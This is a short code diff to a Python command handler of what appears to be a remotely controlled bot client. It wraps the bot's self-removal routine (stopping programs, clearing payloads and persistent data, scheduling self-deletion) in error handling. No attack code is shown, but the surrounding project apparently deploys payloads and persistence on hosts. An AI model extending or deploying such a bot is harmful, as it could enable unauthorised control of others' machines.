@@ -129,10 +129,13 @@ class CommandHandler:
 
     # Take all necesarry steps so safely remove the bots program
     def __handle_remove(self, id, params):
-        self.exeHandler.stop_all_programs()
-        self.__cleanupPayloads()
-        self.__cleanupPresistantData()
-        self.__schedule_self_delete()
+        try:
+            self.exeHandler.stop_all_programs()
+            self.__cleanupPayloads()
+            self.__cleanupPresistantData()
+            self.__schedule_self_delete()
+        except Exception as e:
+            print(f"Error remove: {e}")
 
 
     # Uniformly handle "for all" or "for me" command executions
